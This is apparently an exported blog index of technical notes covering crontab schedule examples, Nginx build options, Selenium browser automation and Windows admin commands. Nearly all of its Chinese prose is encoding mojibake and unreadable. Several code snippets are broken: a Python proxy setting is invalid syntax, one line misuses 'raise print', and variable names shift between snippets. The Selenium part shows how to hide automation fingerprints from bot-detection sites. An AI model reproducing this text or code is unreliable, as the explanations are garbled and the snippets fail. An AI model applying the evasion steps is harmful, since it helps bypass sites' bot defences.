<td align="left">æ¯å¤© 00:00 æ‰§è¡Œä¸€æ¬¡ä»»åŠ¡</td>
</tr>
<tr>
<td align="left">00 14 10 3,6,9,12 *</td>
<td align="left">åœ¨3æœˆã€6æœˆã€9æœˆå’Œ12æœˆçš„10æ—¥14:00æ‰§è¡Œä¸€æ¬¡</td>
</tr>
<tr>
<td align="left">25,50 1 15 * 2</td>
<td align="left">åœ¨æ¯å‘¨äºŒ1:25ã€1:50å’Œæ¯æœˆ15æ—¥æ‰§è¡Œä¸€æ¬¡</td>
</tr>
<tr>
<td align="left">*&#x2F;5 * * * 1-5</td>
<td align="left">åœ¨æ¯å‘¨çš„å‘¨ä¸€è‡³å‘¨äº”æ¯5åˆ†é’Ÿæ‰§è¡Œä¸€æ¬¡</td>
</tr>
</tbody></table>
<h2 id="æœåŠ¡æ“ä½œ"><a href="#æœåŠ¡æ“ä½œ" class="headerlink" title="æœåŠ¡æ“ä½œ"></a>æœåŠ¡æ“ä½œ</h2><p>é‡å¯æœåŠ¡</p>
<figure class="highlight ebnf"><table><tr><td class="code"><pre><span class="line"><span class="attribute">sudo service cron restart</span></span><br></pre></td></tr></table></figure>

<p>ubuntuä¸‹å¯åŠ¨ã€åœæ­¢ä¸é‡å¯cron</p>
<figure class="highlight awk"><table><tr><td class="code"><pre><span class="line">sudo <span class="regexp">/etc/i</span>nit.d/cron start</span><br><span class="line">sudo <span class="regexp">/etc/i</span>nit.d/cron stop</span><br><span class="line">sudo <span class="regexp">/etc/i</span>nit.d/cron restart</span><br></pre></td></tr></table></figure>



<h2 id="å‚è€ƒé“¾æ¥"><a href="#å‚è€ƒé“¾æ¥" class="headerlink" title="å‚è€ƒé“¾æ¥"></a>å‚è€ƒé“¾æ¥</h2><ul>
<li><span class="exturl" data-url="aHR0cHM6Ly9saW51eHRvb2xzLXJzdC5yZWFkdGhlZG9jcy5pby96aF9DTi9sYXRlc3QvdG9vbC9jcm9udGFiLmh0bWw=">https://linuxtools-rst.readthedocs.io/zh_CN/latest/tool/crontab.html</span></li>
<li><span class="exturl" data-url="aHR0cHM6Ly9saW51eGNvbmZpZy5vcmcvbGludXgtY3JvbnRhYi1yZWZlcmVuY2UtZ3VpZGU=">https://linuxconfig.org/linux-crontab-reference-guide</span></li>
</ul>
]]></content>
      <categories>
        <category>å‘½ä»¤æ–‡æ¡£</category>
      </categories>
      <tags>
        <tag>Linux</tag>
        <tag>crontab</tag>
      </tags>
  </entry>
  <entry>
    <title>Nginx configure å‚æ•°</title>
    <url>/nginx-configure/</url>
    <content><![CDATA[<blockquote>
<p>å®˜æ–¹æ–‡æ¡£ -&gt; <span class="exturl" data-url="aHR0cHM6Ly93d3cubmdpbnguY29tL3Jlc291cmNlcy93aWtpL3N0YXJ0L3RvcGljcy90dXRvcmlhbHMvaW5zdGFsbG9wdGlvbnMv">ğŸšª</span></p>
</blockquote>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">å‘½ä»¤è¡ŒæŸ¥çœ‹</span></span><br><span class="line">./configure --help</span><br></pre></td></tr></table></figure>

<h2 id="æ–‡ä»¶å’Œæƒé™"><a href="#æ–‡ä»¶å’Œæƒé™" class="headerlink" title="æ–‡ä»¶å’Œæƒé™"></a>æ–‡ä»¶å’Œæƒé™</h2><table>
<thead>
<tr>
<th>å‚æ•°</th>
<th>è¯´æ˜</th>
</tr>
</thead>
<tbody><tr>
<td><strong>â€“prefix&#x3D;*path*</strong></td>
<td>å®šä¹‰ä¿å­˜æœåŠ¡å™¨æ–‡ä»¶çš„ç›®å½•ã€‚è¿™ä¸ªç›®å½•ä¹Ÿå°†ç”¨äºæ‰€æœ‰ç”±configureè®¾ç½®çš„ç›¸å¯¹è·¯å¾„(åº“æºè·¯å¾„é™¤å¤–)å’Œnginx.confé…ç½®æ–‡ä»¶ä¸­ã€‚é»˜è®¤è®¾ç½®ä¸º<code>/usr/local/nginx</code>ç›®å½•ã€‚</td>
</tr>
<tr>
<td><strong>â€“sbin-path&#x3D;*path*</strong></td>
<td>è®¾ç½®NGINXå¯æ‰§è¡Œæ–‡ä»¶çš„åç§°ã€‚æ­¤åç§°ä»…åœ¨å®‰è£…è¿‡ç¨‹ä¸­ä½¿ç”¨ã€‚é»˜è®¤æ–‡ä»¶åä¸º<code>prefix/sbin/nginx</code>ã€‚</td>
</tr>
<tr>
<td><strong>â€“conf-path&#x3D;*path*</strong></td>
<td>è®¾ç½®<code>nginx.conf</code>é…ç½®æ–‡ä»¶çš„åç§°ã€‚å¦‚æœéœ€è¦ï¼ŒNGINXæ€»æ˜¯å¯ä»¥é€šè¿‡å‘½ä»¤è¡Œå‚æ•°<code>-c file</code>æŒ‡å®šä¸€ä¸ªä¸åŒçš„é…ç½®æ–‡ä»¶æ¥å¯åŠ¨ã€‚é»˜è®¤æ–‡ä»¶åä¸º<code>prefix/conf/nginx.conf</code>ã€‚</td>
</tr>
<tr>
<td><strong>â€“pid-path&#x3D;*path*</strong></td>
<td>è®¾ç½®nginxçš„åç§°ã€‚pidæ–‡ä»¶ï¼Œç”¨äºå­˜å‚¨ä¸»è¿›ç¨‹çš„è¿›ç¨‹IDã€‚å®‰è£…å®Œæˆåï¼Œå¯ä»¥åœ¨<code>nginx.conf</code>é…ç½®æ–‡ä»¶ä¸­ä½¿ç”¨pidæŒ‡ä»¤æ›´æ”¹æ–‡ä»¶åã€‚é»˜è®¤æ–‡ä»¶åä¸º<code>prefix/logs/nginx.pid</code>ã€‚</td>
</tr>
<tr>
<td><strong>â€“error-log-path&#x3D;*path*</strong></td>
<td>è®¾ç½®ä¸»è¦é”™è¯¯ã€è­¦å‘Šå’Œè¯Šæ–­æ–‡ä»¶çš„åç§°ã€‚å®‰è£…å®Œæˆåï¼Œå¯ä»¥ä½¿ç”¨é”™è¯¯æ—¥å¿—æŒ‡ä»¤åœ¨<code>nginx.conf</code>é…ç½®æ–‡ä»¶ä¸­æ›´æ”¹æ–‡ä»¶åã€‚é»˜è®¤æ–‡ä»¶åä¸º<code>prefix/logs/error.log</code>ã€‚ç‰¹æ®Šçš„â€œstderrâ€å€¼å‘Šè¯‰NGINXå°†é¢„é…ç½®æ¶ˆæ¯è®°å½•åˆ°æ ‡å‡†é”™è¯¯ã€‚</td>
</tr>
<tr>
<td><strong>â€“http-log-path&#x3D;*path*</strong></td>
<td>è®¾ç½®HTTPæœåŠ¡å™¨çš„ä¸»è¯·æ±‚æ—¥å¿—æ–‡ä»¶çš„åç§°ã€‚å®‰è£…å®Œæˆåï¼Œå¯ä»¥ä½¿ç”¨<code>access log</code>æŒ‡ä»¤åœ¨<code>nginx.conf</code>é…ç½®æ–‡ä»¶ä¸­æ›´æ”¹æ–‡ä»¶åã€‚é»˜è®¤æ–‡ä»¶åä¸º<code>prefix/logs/access.log</code>ã€‚</td>
</tr>
<tr>
<td><strong>â€“user&#x3D;*name*</strong></td>
<td>è®¾ç½®å·¥ä½œè¿›ç¨‹å°†ä½¿ç”¨å…¶å‡­è¯çš„éç‰¹æƒç”¨æˆ·çš„åç§°ã€‚åœ¨å®‰è£…ä¹‹åï¼Œè¿™ä¸ªåå­—æ€»æ˜¯å¯ä»¥åœ¨<code>nginx.conf</code>é…ç½®æ–‡ä»¶ä¸­ä½¿ç”¨useræŒ‡ä»¤æ›´æ”¹ã€‚é»˜è®¤ç”¨æˆ·åä¸ºnobodyã€‚</td>
</tr>
<tr>
<td><strong>â€“group&#x3D;*name*</strong></td>
<td>è®¾ç½®å·¥ä½œè¿›ç¨‹å°†ä½¿ç”¨å…¶å‡­è¯çš„ç»„çš„åç§°ã€‚å®‰è£…åï¼Œåœ¨<code>nginx.conf</code>é…ç½®æ–‡ä»¶ä¸­å¯ä»¥ä½¿ç”¨useræŒ‡ä»¤æ›´æ”¹åç§°ã€‚ç¼ºçœæƒ…å†µä¸‹ï¼Œç»„åä¸ºéç‰¹æƒç”¨æˆ·çš„åç§°ã€‚</td>
</tr>
</tbody></table>
<h2 id="äº‹ä»¶å¾ªç¯"><a href="#äº‹ä»¶å¾ªç¯" class="headerlink" title="äº‹ä»¶å¾ªç¯"></a>äº‹ä»¶å¾ªç¯</h2><table>
<thead>
<tr>
<th>å‚æ•°</th>
<th>è¯´æ˜</th>
</tr>
</thead>
<tbody><tr>
<td><strong>â€“with-select_module, â€“without-select_module</strong></td>
<td>å¯ç”¨æˆ–ç¦ç”¨æ„å»ºå…è®¸æœåŠ¡å™¨ä½¿ç”¨<code>select()</code>æ–¹æ³•çš„æ¨¡å—ã€‚å¦‚æœå¹³å°ä¸æ”¯æŒæ›´åˆé€‚çš„æ–¹æ³•ï¼Œå¦‚<code>kqueue</code>ã€<code>epoll</code>ã€<code>rtsig</code>æˆ–<code>/dev/poll</code>ï¼Œåˆ™ä¼šè‡ªåŠ¨æ„å»ºæ­¤æ¨¡å—ã€‚</td>
</tr>
<tr>
<td><strong>â€“with-poll_module, â€“without-poll_module</strong></td>
<td>å¯ç”¨æˆ–ç¦ç”¨æ„å»ºå…è®¸æœåŠ¡å™¨ä½¿ç”¨<code>poll()</code>æ–¹æ³•çš„æ¨¡å—ã€‚å¦‚æœå¹³å°ä¸æ”¯æŒæ›´åˆé€‚çš„æ–¹æ³•ï¼Œå¦‚<code>kqueue</code>ã€<code>epoll</code>ã€<code>rtsig</code>æˆ–<code>/dev/poll</code>ï¼Œåˆ™ä¼šè‡ªåŠ¨æ„å»ºæ­¤æ¨¡å—ã€‚</td>
</tr>
</tbody></table>
<h2 id="å…¶å®ƒå¯é€‰"><a href="#å…¶å®ƒå¯é€‰" class="headerlink" title="å…¶å®ƒå¯é€‰"></a>å…¶å®ƒå¯é€‰</h2><table>
<thead>
<tr>
<th>å‚æ•°</th>
<th>è¯´æ˜</th>
</tr>
</thead>
<tbody><tr>
<td><strong>â€“without-http_gzip_module</strong></td>
<td>ç¦ç”¨æ„å»ºå‹ç¼©HTTPæœåŠ¡å™¨å“åº”çš„æ¨¡å—ã€‚æ„å»ºå’Œè¿è¡Œæ­¤æ¨¡å—éœ€è¦zlibåº“ã€‚</td>
</tr>
<tr>
<td><strong>â€“without-http_rewrite_module</strong></td>
<td>ç¦ç”¨æ„å»ºå…è®¸HTTPæœåŠ¡å™¨é‡å®šå‘è¯·æ±‚å’Œæ›´æ”¹è¯·æ±‚URIçš„æ¨¡å—ã€‚æ„å»ºå’Œè¿è¡Œæ­¤æ¨¡å—éœ€è¦PCREåº“ã€‚è¿™ä¸ªæ¨¡å—æ˜¯å®éªŒæ€§çš„ï¼Œæ‰€ä»¥å®ƒçš„æŒ‡ä»¤å°†æ¥å¯èƒ½ä¼šæ”¹å˜ã€‚</td>
</tr>
<tr>
<td><strong>â€“without-http_proxy_module</strong></td>
<td>ç¦ç”¨æ„å»ºHTTPæœåŠ¡å™¨ä»£ç†æ¨¡å—ã€‚</td>
</tr>
<tr>
<td><strong>â€“with-http_ssl_module</strong></td>
<td>æ”¯æŒæ„å»ºå°†HTTPSåè®®æ”¯æŒæ·»åŠ åˆ°HTTPæœåŠ¡å™¨çš„æ¨¡å—ã€‚é»˜è®¤æƒ…å†µä¸‹ï¼Œæ­¤æ¨¡å—ä¸ä¼šç”Ÿæˆã€‚æ„å»ºå’Œè¿è¡Œæ­¤æ¨¡å—éœ€è¦OpenSSLåº“ã€‚</td>
</tr>
<tr>
<td><strong>â€“with-pcre&#x3D;*path*</strong></td>
<td>è®¾ç½®PCREåº“æºçš„è·¯å¾„ã€‚åº“åˆ†å‘ç‰ˆ(ç‰ˆæœ¬4.4 - 8.21)éœ€è¦ä»PCREç½‘ç«™ä¸‹è½½å¹¶æå–ã€‚å‰©ä¸‹çš„ç”±NGINXçš„ã€‚&#x2F;configureå’Œmakeå®Œæˆã€‚locationæŒ‡ä»¤å’Œngx_http_rewrite_moduleçš„æ­£åˆ™è¡¨è¾¾å¼æ”¯æŒéƒ½éœ€è¦è¿™ä¸ªåº“ã€‚åœ¨FreeBSDç³»ç»Ÿä¸Šä½¿ç”¨PCREç³»ç»Ÿï¼Œè¯·å‚é˜…ä¸‹é¢çš„æ³¨é‡Šã€‚</td>
</tr>
<tr>
<td><strong>â€“with-pcre-jit</strong></td>
<td>æ„å»ºå¸¦æœ‰â€œå³æ—¶ç¼–è¯‘â€æ”¯æŒçš„PCREåº“ã€‚</td>
</tr>
<tr>
<td><strong>â€“with-zlib&#x3D;*path*</strong></td>
<td>è®¾ç½®zlibåº“çš„æºä»£ç çš„è·¯å¾„ã€‚åº“å‘è¡Œç‰ˆ(ç‰ˆæœ¬1.1.3 - 1.2.5)éœ€è¦ä»zlibç«™ç‚¹ä¸‹è½½å¹¶è§£å‹ã€‚å‰©ä¸‹çš„ç”±NGINXçš„ã€‚&#x2F;configureå’Œmakeå®Œæˆã€‚è¿™ä¸ªåº“æ˜¯ngx_http_gzip_moduleæ‰€å¿…éœ€çš„ã€‚</td>
</tr>
</tbody></table>
<h2 id="ç¼–è¯‘æ§åˆ¶"><a href="#ç¼–è¯‘æ§åˆ¶" class="headerlink" title="ç¼–è¯‘æ§åˆ¶"></a>ç¼–è¯‘æ§åˆ¶</h2><table>
<thead>
<tr>
<th>å‚æ•°</th>
<th>è¯´æ˜</th>
</tr>
</thead>
<tbody><tr>
<td><strong>â€“with-cc-opt&#x3D;*parameters*</strong></td>
<td>è®¾ç½®å°†æ·»åŠ åˆ°CFLAGSå˜é‡çš„é™„åŠ å‚æ•°ã€‚</td>
</tr>
<tr>
<td><strong>â€“with-ld-opt&#x3D;*parameters*</strong></td>
<td>è®¾ç½®å°†åœ¨é“¾æ¥æœŸé—´ä½¿ç”¨çš„é™„åŠ å‚æ•°ã€‚</td>
</tr>
</tbody></table>
<h2 id="ä¾‹å­"><a href="#ä¾‹å­" class="headerlink" title="ä¾‹å­"></a>ä¾‹å­</h2><figure class="highlight basic"><table><tr><td class="code"><pre><span class="line">./configure</span><br><span class="line">    --sbin-path=/<span class="keyword">usr</span>/local/nginx/nginx</span><br><span class="line">    --conf-path=/<span class="keyword">usr</span>/local/nginx/nginx.conf</span><br><span class="line">    --pid-path=/<span class="keyword">usr</span>/local/nginx/nginx.pid</span><br><span class="line">    --with-http_ssl_module</span><br><span class="line">    --with-pcre=../pcre-<span class="number">4.4</span></span><br><span class="line">    --with-zlib=../zlib-<span class="number">1.1</span>.<span class="number">3</span></span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>å‘½ä»¤æ–‡æ¡£</category>
      </categories>
      <tags>
        <tag>Nginx</tag>
      </tags>
  </entry>
  <entry>
    <title>Selenium æ“ä½œæ–‡æ¡£</title>
    <url>/selenium/</url>
    <content><![CDATA[<h2 id="ç®€å•ä»‹ç»"><a href="#ç®€å•ä»‹ç»" class="headerlink" title="ç®€å•ä»‹ç»"></a>ç®€å•ä»‹ç»</h2><blockquote>
<p>åŸºäºæµè§ˆå™¨é©±åŠ¨çš„è‡ªåŠ¨åŒ–æ“ä½œæµè§ˆå™¨å·¥å…·, ç”¨äºè¿ç»´æµ‹è¯•ä¹Ÿå¯ç”¨äºçˆ¬è™«ã€‚</p>
</blockquote>
<figure class="highlight xl"><table><tr><td class="code"><pre><span class="line">æ“ä½œæµç¨‹</span><br><span class="line"><span class="function"><span class="title">selenium</span> -&gt;</span> ä¼ è¾“æŒ‡ä»¤ â€”&gt; <span class="function"><span class="title">webdriver</span> -&gt;</span> è½¬æ¢æŒ‡ä»¤ -&gt; æµè§ˆå™¨æ‰§è¡Œ</span><br></pre></td></tr></table></figure>



<h2 id="å®‰è£…ä½¿ç”¨"><a href="#å®‰è£…ä½¿ç”¨" class="headerlink" title="å®‰è£…ä½¿ç”¨"></a>å®‰è£…ä½¿ç”¨</h2><ul>
<li><p>å®‰è£…Pythonç‰ˆæœ¬çš„selenium</p>
  <figure class="highlight cmake"><table><tr><td class="code"><pre><span class="line">pip <span class="keyword">install</span> selenium</span><br></pre></td></tr></table></figure>
</li>
<li><p>æŸ¥çœ‹Chromeç‰ˆæœ¬ï¼Œæµè§ˆå™¨è¾“å…¥å›è½¦</p>
  <figure class="highlight awk"><table><tr><td class="code"><pre><span class="line">chrome:<span class="regexp">//</span>version/</span><br></pre></td></tr></table></figure>
</li>
<li><p>ä¸‹è½½å¯¹åº”æµè§ˆå™¨ç‰ˆæœ¬çš„chrome driver<br>  <em>PS:é©±åŠ¨ç‰ˆæœ¬é€‰æ‹©æœ€æ¥è¿‘çš„ï¼Œä¸ä¸€å®šè¦å®Œå…¨ä¸€æ ·çš„ã€‚</em></p>
<ul>
<li><span class="exturl" data-url="aHR0cDovL25wbS50YW9iYW8ub3JnL21pcnJvcnMvY2hyb21lZHJpdmVyLw==">æ·˜å®é•œåƒä¸‹è½½</span></li>
<li><span class="exturl" data-url="aHR0cHM6Ly9jaHJvbWVkcml2ZXIuY2hyb21pdW0ub3JnL2Rvd25sb2Fkcw==">å®˜æ–¹ä¸‹è½½</span> (éœ€è¦æŒ‚ä»£ç†)</li>
</ul>
</li>
<li><p>è§£å‹åˆ°ç‰¹å®šç›®å½•ï¼Œæ–¹ä¾¿è°ƒç”¨</p>
  <figure class="highlight livescript"><table><tr><td class="code"><pre><span class="line">.<span class="string">\drivers\</span></span><br></pre></td></tr></table></figure></li>
</ul>
<h2 id="å¯¼å…¥"><a href="#å¯¼å…¥" class="headerlink" title="å¯¼å…¥"></a>å¯¼å…¥</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> selenium <span class="keyword">import</span> webdriver</span><br><span class="line"><span class="keyword">from</span> setting <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">options = webdriver.ChromeOptions()</span><br><span class="line"></span><br><span class="line"><span class="comment"># é…ç½® ...</span></span><br><span class="line"></span><br><span class="line">brower = webdriver.Chrome(executable_path=DRIVER_PATH, options=options)</span><br></pre></td></tr></table></figure>



<h2 id="é…ç½®"><a href="#é…ç½®" class="headerlink" title="é…ç½®"></a>é…ç½®</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">UA = <span class="string">&#x27;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.131 Safari/537.36&#x27;</span></span><br><span class="line">PROXY = &#123;<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>:<span class="number">7890</span>&#125;</span><br><span class="line">CACHE_DIR = <span class="string">r&#x27;cache/user_1&#x27;</span></span><br></pre></td></tr></table></figure>

<p><strong>é©±åŠ¨è·¯å¾„é…ç½®</strong></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> platform</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> platform.system() == <span class="string">&#x27;Windows&#x27;</span>:</span><br><span class="line">    DRIVER_PATH = <span class="string">r&quot;drivers/win/chromedriver.exe&quot;</span></span><br><span class="line"><span class="keyword">elif</span> platform.system() == <span class="string">&#x27;Linux&#x27;</span>:</span><br><span class="line">    <span class="comment"># Linuxä¸‹èµ‹äºˆé©±åŠ¨æ‰§è¡Œæƒé™ sudo chmod +x drivers/chromedriver_linux64/chromedriver</span></span><br><span class="line">    DRIVER_PATH = <span class="string">r&quot;drivers/linux/chromedriver&quot;</span></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    <span class="keyword">raise</span> <span class="built_in">print</span>(<span class="string">f&#x27;!!Error Driver path!!\nUnknown system: <span class="subst">&#123;platform.system()&#125;</span>&#x27;</span>)</span><br></pre></td></tr></table></figure>



<h2 id="å¸¸ç”¨è®¾ç½®"><a href="#å¸¸ç”¨è®¾ç½®" class="headerlink" title="å¸¸ç”¨è®¾ç½®"></a>å¸¸ç”¨è®¾ç½®</h2><ul>
<li><p>æ— å¤´æ¨¡å¼</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># Headless</span></span><br><span class="line">options.add_argument(<span class="string">&quot;--headless&quot;</span>)</span><br></pre></td></tr></table></figure>
</li>
<li><p>ç¦ç”¨å›¾ç‰‡åŠ è½½</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># Disable image loading</span></span><br><span class="line">prefs = &#123; <span class="string">&#x27;profile.managed_default_content_settings.images&#x27;</span>: <span class="number">2</span> &#125;</span><br><span class="line">options.add_experimental_option(<span class="string">&quot;prefs&quot;</span>, prefs)</span><br></pre></td></tr></table></figure>
</li>
<li><p>è®¾ç½®User-Agent</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># UA</span></span><br><span class="line">options.add_argument(<span class="string">f&#x27;user-agent=<span class="subst">&#123;UA&#125;</span>&#x27;</span>)</span><br></pre></td></tr></table></figure>
</li>
<li><p>è®¾ç½®ä»£ç†</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># Proxy</span></span><br><span class="line">options.add_argument(<span class="string">f&quot;--proxy-server=<span class="subst">&#123;PROXY&#125;</span>&quot;</span>)</span><br></pre></td></tr></table></figure>
</li>
<li><p>è®¾ç½®ç¼“å­˜</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># Cache data</span></span><br><span class="line">options.add_argument(<span class="string">f&quot;--user-data-dir=<span class="subst">&#123;CACHE_DIR&#125;</span>&quot;</span>)</span><br></pre></td></tr></table></figure>
</li>
<li><p>è®¾ç½®éšå¼ç­‰å¾…</p>
<figure class="highlight apache"><table><tr><td class="code"><pre><span class="line"><span class="attribute">brower</span>.implicitly_wait(<span class="number">10</span>)</span><br></pre></td></tr></table></figure>
</li>
<li><p>è®¾ç½®çª—å£å¤§å°</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># resize</span></span><br><span class="line">options.add_argument(<span class="string">&#x27;window-size=1500x1200&#x27;</span>) </span><br></pre></td></tr></table></figure></li>
</ul>
<h2 id="æµè§ˆå™¨ç‰¹å¾éšè—"><a href="#æµè§ˆå™¨ç‰¹å¾éšè—" class="headerlink" title="æµè§ˆå™¨ç‰¹å¾éšè—"></a>æµè§ˆå™¨ç‰¹å¾éšè—</h2><p><strong>éšè—é©±åŠ¨æ ‡è¯†</strong></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># Delete &quot;navigator.webdriver&quot; property</span></span><br><span class="line">options.add_argument(<span class="string">&quot;disable-blink-features=AutomationControlled&quot;</span>)</span><br></pre></td></tr></table></figure>



<p>ä½¿ç”¨puppeteerå‰ç«¯æ¡†æ¶éšè—æ¨¡æ‹Ÿæµè§ˆå™¨çš„æŒ‡çº¹ç‰¹å¾çš„JS</p>
<blockquote>
<p>é¡¹ç›®åœ°å€ -&gt; <span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL2JlcnN0ZW5kL3B1cHBldGVlci1leHRyYS90cmVlL21hc3Rlci9wYWNrYWdlcy9leHRyYWN0LXN0ZWFsdGgtZXZhc2lvbnM=">ğŸšª</span></p>
</blockquote>
<p><code>stealth.min.js</code>æ–‡ä»¶ç”Ÿæˆ, éœ€å®‰è£…å¥½<code>node.js</code>ç¯å¢ƒ, <del>ä¸æŒ‚ä»£ç†é€Ÿåº¦ä¼šå¾ˆæ…¢</del></p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="comment"># æ‰§è¡Œä»¥ä¸‹è¯­å¥,ä¼šåœ¨å½“å‰æ–‡ä»¶å¤¹ç”Ÿæˆstealth.min.jsæ–‡ä»¶</span></span><br><span class="line">npx extract-stealth-evasions</span><br></pre></td></tr></table></figure>

<p>åŠ è½½è¿›æµè§ˆå™¨</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># æ‰§è¡Œéšè—é©±åŠ¨ç‰¹å¾JS</span></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">r&#x27;data/stealth.min.js&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    stealth_js = f.read()</span><br><span class="line">brower.execute_cdp_cmd(<span class="string">&quot;Page.addScriptToEvaluateOnNewDocument&quot;</span>, &#123;<span class="string">&#x27;source&#x27;</span>: stealth_js&#125;)</span><br></pre></td></tr></table></figure>



<p>è¿›å…¥ <span class="exturl" data-url="aHR0cHM6Ly9ib3Quc2Fubnlzb2Z0LmNvbS8=">https://bot.sannysoft.com</span> æµ‹è¯•æ•ˆæœ</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">driver.get(<span class="string">&#x27;https://bot.sannysoft.com/&#x27;</span>)</span><br><span class="line">time.sleep(<span class="number">5</span>)</span><br><span class="line">driver.save_screenshot(<span class="string">&#x27;walkaround.png&#x27;</span>)</span><br></pre></td></tr></table></figure>



<h2 id="å…¶å®ƒé…ç½®"><a href="#å…¶å®ƒé…ç½®" class="headerlink" title="å…¶å®ƒé…ç½®"></a>å…¶å®ƒé…ç½®</h2><ul>
<li><p>ç¦ç”¨JavaScript</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># Disable JS</span></span><br><span class="line">option.add_argument(<span class="string">&quot;--disable-javascript&quot;</span>) </span><br></pre></td></tr></table></figure>
</li>
<li><p>ç¦ç”¨æµè§ˆå™¨å¼¹çª—</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># Disable the browser popover</span></span><br><span class="line">prefs = &#123;  </span><br><span class="line">    <span class="string">&#x27;profile.default_content_setting_values&#x27;</span> :  &#123;  </span><br><span class="line">        <span class="string">&#x27;notifications&#x27;</span> : <span class="number">2</span>  </span><br><span class="line">     &#125;  </span><br><span class="line">&#125;  </span><br><span class="line">options.add_experimental_option(<span class="string">&#x27;prefs&#x27;</span>,prefs)</span><br></pre></td></tr></table></figure></li>
</ul>
<h2 id="ä½“éªŒé—®é¢˜"><a href="#ä½“éªŒé—®é¢˜" class="headerlink" title="ä½“éªŒé—®é¢˜"></a>ä½“éªŒé—®é¢˜</h2><p>å…³é—­æ—¥å¿—è¾“å‡º</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># Close logs</span></span><br><span class="line">options.add_experimental_option(<span class="string">&#x27;excludeSwitches&#x27;</span>, [<span class="string">&#x27;enable-logging&#x27;</span>])</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>å‘½ä»¤æ–‡æ¡£</category>
      </categories>
      <tags>
        <tag>Python</tag>
        <tag>Selenium</tag>
      </tags>
  </entry>
  <entry>
    <title>Windows å‘½ä»¤æ–‡æ¡£</title>
    <url>/win/</url>
    <content><![CDATA[<blockquote>
<p>ä»ç©Windowsè‡³ä»Šé‡åˆ°è¶…è¿‡2æ¬¡çš„å‘½ä»¤æˆ–é—®é¢˜è®°å½•.</p>
<p>éƒ¨åˆ†å‘½ä»¤cmdå’ŒPowerShellç¯å¢ƒä¸‹å‡å¯ç”¨, æ•…ä¸ä½œç»†åˆ†ğŸ˜œ</p>
</blockquote>
<p>PS: å¤§å¤šæ•°æƒ…å†µä½¿ç”¨ <code>help &lt;å‘½ä»¤&gt;</code> æˆ–è€… <code>&lt;å‘½ä»¤&gt; help</code> æŸ¥çœ‹å¸®åŠ©æ–‡æ¡£å¯ä»¥è‡ªè¡Œè§£å†³é—®é¢˜.</p>
<h2 id="å¸¸ç”¨å‘½ä»¤"><a href="#å¸¸ç”¨å‘½ä»¤" class="headerlink" title="å¸¸ç”¨å‘½ä»¤"></a>å¸¸ç”¨å‘½ä»¤</h2><figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="comment"># æ¸…å±</span></span><br><span class="line"><span class="built_in">cls</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># è®¾ç½®æ°¸ä¹…å˜é‡, åŠ ä¸Š /m ä¸ºç³»ç»Ÿå˜é‡, è·¯å¾„æœ‰ç©ºæ ¼è¦ç”¨åŒå¼•å·æ‹¬èµ·æ¥</span></span><br><span class="line">setx env_name env_value /m</span><br><span class="line"><span class="comment"># è¿½åŠ ç¯å¢ƒå˜é‡</span></span><br><span class="line">setx <span class="string">&quot;path&quot;</span> <span class="string">&quot;%path%D:\test;&quot;</span> /m</span><br><span class="line"></span><br><span class="line"><span class="comment"># é‡å¯èµ„æºç®¡ç†å™¨</span></span><br><span class="line">taskkill /f /im explorer.exe &amp; <span class="built_in">start</span> explorer.exe</span><br><span class="line"></span><br><span class="line"><span class="comment"># å¯»æ‰¾ç«¯å£ç¨‹åº</span></span><br><span class="line">netstat <span class="literal">-ano</span> | findstr <span class="number">8080</span></span><br><span class="line"><span class="comment"># åœæ­¢ç¨‹åº</span></span><br><span class="line">taskkill <span class="literal">-pid</span> &lt;è¿›ç¨‹pid&gt; <span class="operator">-f</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># æŸ¥çœ‹åºåˆ—å·</span></span><br><span class="line">wmic bios get serialnumber</span><br><span class="line"></span><br><span class="line"><span class="comment"># æ˜¾ç¤ºæ­£åœ¨è¿è¡ŒæœåŠ¡</span></span><br><span class="line">net <span class="built_in">start</span></span><br><span class="line"><span class="comment"># å¯åŠ¨æœåŠ¡</span></span><br><span class="line">net <span class="built_in">start</span> [æœåŠ¡å]</span><br><span class="line"><span class="comment"># åœæ­¢æœåŠ¡</span></span><br><span class="line">net stop</span><br></pre></td></tr></table></figure>

<p><strong>PowerShellç¯å¢ƒå˜é‡æ“ä½œ</strong></p>
